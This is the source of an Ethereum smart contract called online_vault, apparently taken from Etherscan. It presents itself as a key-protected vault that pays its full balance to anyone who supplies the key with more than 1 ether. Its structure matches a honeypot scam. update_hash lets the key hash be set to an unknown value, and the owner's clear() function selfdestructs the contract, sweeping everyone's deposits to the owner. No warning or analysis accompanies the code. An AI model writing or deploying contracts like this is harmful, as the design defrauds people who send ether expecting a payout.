/**
 * Source Code first verified at https://etherscan.io on Monday, March 25, 2019
 (UTC) */

pragma solidity ^0.4.25;

contract online_vault
{
    bytes32 keyHash;
    address owner;
    bytes32 wallet_id = 0x384cc4bc3a08dd6241f5d267dbc34f4b80f7ff2f872d60b93d0c4b2b90bdc908;

    constructor() public {
        owner = msg.sender;
    }

    function withdraw(string key) public payable
    {
        require(msg.sender == tx.origin);
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value > 1 ether) {
                msg.sender.transfer(address(this).balance);
            }
        }
    }

    function setup_key(string key) public
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }

    function update_hash(bytes32 _keyHash) public
    {
        if (keyHash == 0x0) {
            keyHash = _keyHash;
        }
    }

    function clear() public
    {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function get_id() public view returns(bytes32){
        return wallet_id;
    }

    function () public payable {
    }
}